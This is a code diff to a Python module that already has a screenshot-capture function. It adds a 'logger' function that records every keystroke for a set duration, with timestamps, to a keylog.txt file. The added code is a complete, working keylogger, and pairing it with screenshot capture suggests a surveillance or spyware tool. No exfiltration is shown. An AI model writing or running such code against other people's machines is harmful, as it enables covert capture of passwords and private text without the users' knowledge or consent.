@@ -38,3 +38,30 @@ def capture_SS(file_name: str = "Picture.png", overwrite: bool = True) -> str:
     # print(path + namae)
     pyautogui.screenshot(path + namae)
     return path + namae
+
+
+def logger(duration: int) -> str:
+    file_path: str = "src\\Logging\\keylog.txt"
+    # ? Ensure the existence of the file
+    with open(file_path, "w") as f:
+        pass
+
+    logging.basicConfig(
+        filename=file_path,
+        filemode="w",
+        level=logging.DEBUG,
+        format="%(asctime)s - %(message)s",
+        datefmt="%d-%b-%y %H:%M:%S",
+    )
+
+    def on_press(key):
+        try:
+            logging.info(str(key))
+        except AttributeError:
+            logging.error(str(key))
+
+    with Listener(on_press=on_press) as listener:
+        sleep(duration)
+        listener.stop()
+
+    return file_path
